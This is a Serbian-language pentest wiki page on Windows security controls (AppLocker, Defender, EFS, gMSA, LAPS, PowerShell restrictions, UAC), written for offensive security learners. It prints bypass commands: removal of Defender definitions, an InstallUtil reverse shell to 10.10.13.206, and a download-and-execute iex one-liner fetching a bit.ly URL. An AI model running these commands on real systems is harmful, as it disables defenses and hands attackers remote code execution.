# Windows Security Controls

{{#include ../banners/hacktricks-training.md}}

## AppLocker Policy

Application whitelist je lista odobrenih softverskih aplikacija ili izvršnih datoteka kojima je dozvoljeno da budu prisutne i da se pokreću na sistemu. Cilj je zaštititi okruženje od štetnog malware-a i neodobrenog softvera koji nije usklađen sa specifičnim poslovnim potrebama organizacije.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) je Microsoft-ovo **rešenje za application whitelisting** i administratorima sistema pruža kontrolu nad tim **koje aplikacije i datoteke korisnici mogu da pokreću**. Omogućava **granularnu kontrolu** nad izvršnim datotekama, skriptama, Windows installer datotekama, DLL-ovima, packaged aplikacijama i packed app installerima.\
Uobičajeno je da organizacije **blokiraju cmd.exe i PowerShell.exe** i zabrane pristup određenim direktorijumima za upis, **ali sve ovo može da se zaobiđe**.

### Provera

Proverite koje datoteke/ekstenzije su na blacklisti/whitelisti:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Ova putanja registra sadrži konfiguracije i politike koje primenjuje AppLocker, što omogućava pregled trenutnog skupa pravila nametnutih na sistemu:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Korisne **upisive fascikle** za zaobilaženje AppLocker Policy: Ako AppLocker dozvoljava izvršavanje bilo čega unutar `C:\Windows\System32` ili `C:\Windows`, postoje **upisive fascikle** koje možete koristiti da **zaobiđete ovo**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Uobičajeno **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries takođe mogu biti korisni za zaobilaženje AppLocker-a.
- **Loše napisanim pravilima takođe se može zaobići zaštita**
- Na primer, za **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, možete kreirati **folder pod nazivom `allowed`** bilo gde i on će biti dozvoljen.
- Organizacije se takođe često fokusiraju na **blokiranje izvršne datoteke `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ali zaboravljaju na **druge lokacije PowerShell izvršnih datoteka** kao što su `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ili `PowerShell_ISE.exe`.
- **DLL enforcement se veoma retko omogućava** zbog dodatnog opterećenja koje može izazvati na sistemu i količine testiranja potrebnog da bi se osiguralo da se ništa neće pokvariti. Zato će korišćenje **DLL-ova kao backdoor-a pomoći u zaobilaženju AppLocker-a**.
- Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) za **izvršavanje Powershell** koda u bilo kom procesu i zaobilaženje AppLocker-a. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Skladištenje kredencijala

### Security Accounts Manager (SAM)

Lokalni kredencijali se nalaze u ovoj datoteci, a lozinke su hash-ovane.

### Local Security Authority (LSA) - LSASS

**Kredencijali** (hash-ovani) se **čuvaju** u **memoriji** ovog podsistema zbog Single Sign-On razloga.\
**LSA** administrira lokalnu **security policy** (politiku lozinki, dozvole korisnika...), **authentication**, **access tokens**...\
LSA će proveravati **prosleđene kredencijale** unutar **SAM** datoteke (za lokalno prijavljivanje) i komunicirati sa **domain controller-om** radi autentifikacije korisnika domena.

**Kredencijali** se **čuvaju** unutar **LSASS procesa**: Kerberos tiketi, NT i LM hash-evi, lako dešifrujuće lozinke.

### LSA secrets

LSA može sačuvati neke kredencijale na disku:

- Lozinku naloga računara u Active Directory-ju (nedostupan domain controller).
- Lozinke naloga Windows servisa
- Lozinke za scheduled tasks
- Ostalo (lozinka IIS aplikacija...)

### NTDS.dit

To je baza podataka Active Directory-ja. Prisutan je samo na Domain Controller-ima.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) je Antivirus koji je dostupan u Windows-u 10 i Windows-u 11, kao i u verzijama Windows Server-a. On **blokira** uobičajene pentesting alate kao što je **`WinPEAS`**. Međutim, postoje načini da se **ove zaštite zaobiđu**.

### Provera

Da biste proverili **status** programa **Defender**, možete izvršiti PS cmdlet **`Get-MpComputerStatus`** (proverite vrednost **`RealTimeProtectionEnabled`** da biste utvrdili da li je aktivan):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Da biste ga enumerisali, možete takođe pokrenuti:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS štiti datoteke pomoću enkripcije, koristeći **simetrični ključ** poznat kao **File Encryption Key (FEK)**. Ovaj ključ se enkriptuje korisnikovim **javnim ključem** i čuva unutar **alternative data stream** $EFS enkriptovane datoteke. Kada je potrebna dekripcija, odgovarajući **privatni ključ** korisnikovog digitalnog sertifikata koristi se za dešifrovanje FEK-a iz $EFS stream-a. Više detalja možete pronaći [ovde](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scenariji dekripcije bez inicijative korisnika** uključuju:

- Kada se datoteke ili fascikle premeste na file system koji ne podržava EFS, kao što je [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), automatski se dekriptuju.
- Enkriptovane datoteke poslate preko mreže putem SMB/CIFS protokola dekriptuju se pre slanja.

Ovaj metod enkripcije omogućava **transparentan pristup** enkriptovanim datotekama njihovom vlasniku. Međutim, samo menjanje lozinke vlasnika i prijavljivanje neće omogućiti dekripciju.

**Ključne napomene**:

- EFS koristi simetrični FEK, enkriptovan korisnikovim javnim ključem.
- Za dekripciju se koristi korisnikov privatni ključ radi pristupa FEK-u.
- Automatska dekripcija se izvršava pod određenim uslovima, kao što su kopiranje na FAT32 ili mrežni prenos.
- Vlasnik može da pristupi enkriptovanim datotekama bez dodatnih koraka.

### Provera EFS informacija

Proverite da li je **user** **koristio** ovaj **service** tako što ćete proveriti da li ova putanja postoji:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Proverite **ko** ima **pristup** datoteci pomoću cipher /c \<file>\
Takođe možete koristiti `cipher /e` i `cipher /d` unutar fascikle da biste **enkriptovali** i **dekriptovali** sve datoteke

### Dekripcija EFS datoteka

#### Being Authority System

Ovaj pristup zahteva da **victim user** ima **pokrenut** **process** na hostu. Ako je to slučaj, iz `meterpreter` sesije možete da impersonate-ujete token korisnikovog procesa (`impersonate_token` iz `incognito`). Alternativno, možete da izvršite `migrate` u korisnikov process.

#### Poznavanje korisnikove lozinke

Mimikatz može da uveze korisnikov sertifikat i privatni ključ, a zatim da ih koristi za dekripciju EFS-zaštićenih datoteka.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft je razvio **Group Managed Service Accounts (gMSA)** radi pojednostavljivanja upravljanja service account-ima u IT infrastrukturama. Za razliku od tradicionalnih service account-a, kod kojih je često omogućena postavka "**Password never expire**", gMSA nude bezbednije rešenje kojim je lakše upravljati:

- **Automatsko upravljanje lozinkama**: gMSA koriste složenu lozinku od 240 karaktera koja se automatski menja u skladu sa pravilima domena ili računara. Ovim procesom upravlja Microsoft-ov Key Distribution Service (KDC), čime se eliminiše potreba za ručnim ažuriranjem lozinki.
- **Poboljšana bezbednost**: Ovi nalozi nisu podložni zaključavanju i ne mogu se koristiti za interaktivna prijavljivanja, čime se povećava njihova bezbednost.
- **Podrška za više hostova**: gMSA mogu da se dele između više hostova, što ih čini idealnim za service-e koji rade na više servera.
- **Mogućnost korišćenja Scheduled Task-a**: Za razliku od managed service account-a, gMSA podržavaju pokretanje Scheduled Task-ova.
- **Pojednostavljeno upravljanje SPN-ovima**: Sistem automatski ažurira Service Principal Name (SPN) kada dođe do promena u sAMaccount detaljima računara ili DNS imenu, čime se pojednostavljuje upravljanje SPN-ovima.

Lozinke za gMSA čuvaju se u LDAP svojstvu _**msDS-ManagedPassword**_ i Domain Controllers (DCs) ih automatski resetuju svakih 30 dana. Ova lozinka, enkriptovani data blob poznat kao [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), može se preuzeti samo od strane ovlašćenih administratora i servera na kojima su gMSA instalirani, čime se obezbeđuje bezbedno okruženje. Za pristup ovim informacijama potrebna je zaštićena konekcija, kao što je LDAPS, ili konekcija mora biti autentifikovana pomoću opcije 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Ovu lozinku možete pročitati pomoću [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Pronađite više informacija u ovoj objavi**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Takođe, pogledajte ovu [web stranicu](https://cube0x0.github.io/Relaying-for-gMSA/) o tome kako izvršiti **NTLM relay attack** za **čitanje** **lozinke** za **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

**Local Administrator Password Solution (LAPS)**, dostupan za preuzimanje sa [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) stranice, omogućava upravljanje lozinkama lokalnog Administrator naloga. Ove lozinke, koje su **nasumične**, jedinstvene i **redovno se menjaju**, centralno se čuvaju u Active Directory-ju. Pristup ovim lozinkama ograničen je pomoću ACL-ova na ovlašćene korisnike. Kada su dodeljene dovoljne dozvole, omogućeno je čitanje lozinki lokalnog administratora.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **ograničava mnoge funkcije** potrebne za efikasno korišćenje PowerShell-a, kao što su blokiranje COM objekata, dozvoljavanje samo odobrenih .NET tipova, workflow-a zasnovanih na XAML-u, PowerShell klasa i drugih funkcija.

### **Provera**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
U aktuelnim verzijama Windows-a taj Bypass neće raditi, ali možete koristiti [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Da biste ga kompajlirali, možda ćete** **morati** _**da dodate referencu**_ -> _Browse_ ->_Browse_ -> dodate `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` i **promenite projekat na .Net4.5**.

#### Direktni bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) da **execute Powershell** kod u bilo kom procesu i zaobiđete constrained mode. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS Execution Policy

Podrazumevano je podešeno na **restricted.** Glavni načini za zaobilaženje ove policy:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Više informacija možete pronaći [ovde](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

To je API koji se može koristiti za autentifikaciju korisnika.

SSPI je zadužen za pronalaženje odgovarajućeg protokola za dve mašine koje žele da komuniciraju. Preferirani metod za ovo je Kerberos. Zatim SSPI pregovara o tome koji će se authentication protocol koristiti; ti authentication protocols se nazivaju Security Support Provider (SSP), nalaze se unutar svake Windows mašine u obliku DLL datoteke i obe mašine moraju podržavati isti protokol da bi mogle da komuniciraju.

### Main SSPs

- **Kerberos**: Preferirani
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** i **NTLMv2**: Zbog kompatibilnosti
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers i LDAP, lozinka u obliku MD5 hash-a
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL i TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Koristi se za pregovaranje o protokolu koji će se koristiti (Kerberos ili NTLM, pri čemu je Kerberos podrazumevani)
- %windir%\Windows\System32\lsasrv.dll

#### Pregovaranje može ponuditi nekoliko metoda ili samo jednu.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **prompt za pristanak za aktivnosti sa povišenim privilegijama**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## References

- [1] [Zaobilaženje AppLocker-a i PowerShell constrained language mode-a](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [kako dešifrovati EFS datoteke](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying za gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 načina za zaobilaženje PowerShell Execution Policy-ja](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
{{#include ../banners/hacktricks-training.md}}
